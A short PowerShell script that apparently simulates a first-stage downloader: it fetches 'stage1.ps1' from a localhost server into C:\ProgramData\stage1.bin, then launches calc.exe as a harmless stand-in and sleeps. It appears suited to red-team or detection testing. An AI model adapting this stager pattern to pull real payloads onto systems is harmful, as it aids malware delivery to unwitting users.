
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://localhost:8080/stage1.ps1',
    [string]$OutputPath = 'C:\ProgramData\stage1.bin',
    [int]$TransferTimeout = 219
)
Invoke-WebRequest -Uri $TargetUrl -OutFile $OutputPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Start-Sleep -Seconds 11
